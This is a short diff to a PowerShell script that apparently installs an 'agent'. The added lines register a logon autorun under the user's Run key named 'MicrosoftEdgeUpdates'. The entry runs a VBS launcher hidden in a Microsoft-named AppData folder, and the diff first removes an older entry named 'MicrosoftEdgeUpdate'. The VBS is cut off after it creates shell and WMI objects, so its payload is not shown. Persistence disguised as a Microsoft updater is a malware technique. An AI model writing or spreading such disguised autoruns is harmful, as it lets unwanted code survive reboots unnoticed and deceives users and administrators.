@@ -19,6 +19,12 @@ if (Test-Path $localPath) {
 $agentPath = Join-Path $scriptDir "agent.ps1"
 $vbsPath = Join-Path $env:APPDATA "Microsoft\launcher.vbs"
 
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
+    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
+}
+Set-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdates" -Value "wscript.exe `"$vbsPath`""
+
 $expectedVbs = @"
 Set objShell = CreateObject("WScript.Shell")
 Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
